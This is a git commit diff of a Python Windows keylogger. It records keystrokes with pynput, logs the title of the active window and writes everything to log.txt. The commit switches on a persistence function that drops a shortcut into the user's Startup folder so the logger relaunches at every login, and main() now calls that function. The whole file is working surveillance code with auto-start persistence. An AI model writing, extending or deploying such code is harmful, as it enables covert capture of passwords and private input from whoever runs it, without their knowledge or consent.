a4f41bc842d895c237c9d5131d43aa76c965d3a6
Оля Бездудная <lyolya0606@gmail.com>
2021-05-27 21:41:28 +0300

    пока рабочая

--- main.py
+++ main.py
@@ -1,33 +1,36 @@
 import datetime
 import platform
+import os
+import getpass
 
 from datetime import datetime
 from pynput.keyboard import Key, Listener
+from win32com.client import Dispatch
 
-#
-# USER_NAME = getpass.getuser()
+USER_NAME = getpass.getuser()
 name_last_active_window = ""
-#
-#
-# # def add_to_startup(file_path=""):
-#    # if file_path == "":
-#       # file_path = os.path.dirname(os.path.realpath(__file__))
-#     # bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
-#     # with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
-#         # bat_file.write(r'start "" %s' % file_path)
-#
-#
+
+
+def add_to_startup():
+    startup_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+    path = os.path.join(startup_path, "start.lnk")
+    file_path = os.path.dirname(os.path.realpath(__file__))
+    target = r"%s\start.vbs" % file_path
+    wDir = file_path
+    icon = r"%s\start.vbs" % file_path
+    shell = Dispatch('WScript.Shell')
+    shortcut = shell.CreateShortCut(path)
+    shortcut.Targetpath = target
+    shortcut.WorkingDirectory = wDir
+    shortcut.IconLocation = icon
+    shortcut.save()
 
 
 def get_active_window():
-    active_window_name = None
     import win32gui
     window = win32gui.GetForegroundWindow()
     active_window_name = win32gui.GetWindowText(window)
     return active_window_name
-
-
-# print("Active window: %s" % str(get_active_window()))
 
 
 def on_press(key):
@@ -64,6 +67,8 @@ def on_release(key):
 
 
 def main():
+    add_to_startup()
+    # add_to_startup(file_path="")
     f = open("log.txt", "w", encoding='utf-8')
     f.write("Operating system: ")
     f.write(platform.platform())
@@ -77,5 +82,3 @@ if __name__ == "__main__":
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-
-
